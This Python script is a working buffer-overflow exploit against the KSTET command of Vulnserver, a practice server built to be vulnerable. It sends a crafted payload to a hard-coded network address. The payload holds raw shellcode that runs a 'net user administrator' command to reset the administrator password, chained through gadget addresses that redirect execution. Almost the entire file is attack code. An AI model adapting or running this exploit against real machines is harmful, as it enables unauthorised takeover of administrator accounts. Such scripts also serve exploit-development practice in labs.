#!/usr/bin/env python3

from struct import pack
import socket

# Tyler Boykin
# http://www.thegreycorner.com/p/vulnserver.html

# Does add+add+jmp, followed by changing the administrators password

def p(x):
    return pack('<I',x)

RHOST="192.168.1.79"
RPORT=9999
OPTIONS = ["STATS","RTIME","LTIME","SRUN","TRUN","GMON","GDOG","KSTET","GTER","HTER","LTER","KSTAN"]

add_esp = p(0x71a661d0).decode("latin1")
add_al_3 = p(0x77ecc056).decode("latin1")
add_al_3 = p(0x77ecc056).decode("latin1") 
jmp_eax = p(0x625011b1).decode("latin1")


def change_pwd():
    sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sockfd.connect((RHOST,RPORT))

    payload = ''
    payload += "KSTET "
    payload += "\x90\x90"
    payload += "\x83\xc4\x40"
    payload += "\x33\xc0"
    payload += "\x50"
    payload += "\x68\x6f\x72\x20\x70"
    payload += "\x68\x74\x72\x61\x74"
    payload += "\x68\x69\x6e\x69\x73"
    payload += "\x68\x20\x61\x64\x6d"
    payload += "\x68\x75\x73\x65\x72"
    payload += "\x68\x6e\x65\x74\x20"
    payload += "\x8b\xc4"
    payload += "\x6a\x01"
    payload += "\x50"
    payload += "\xBB\xc6\x84\xe6\x77"
    payload += "\xff\xd3"
    payload += 'A' * 20
    payload += add_al_3
    payload += add_al_3
    payload += jmp_eax
    payload += "A" * ( 3826 - 12)
    payload += '\r\n'
        
    sockfd.send(payload.encode('latin1'))
    sockfd.close()

change_pwd()
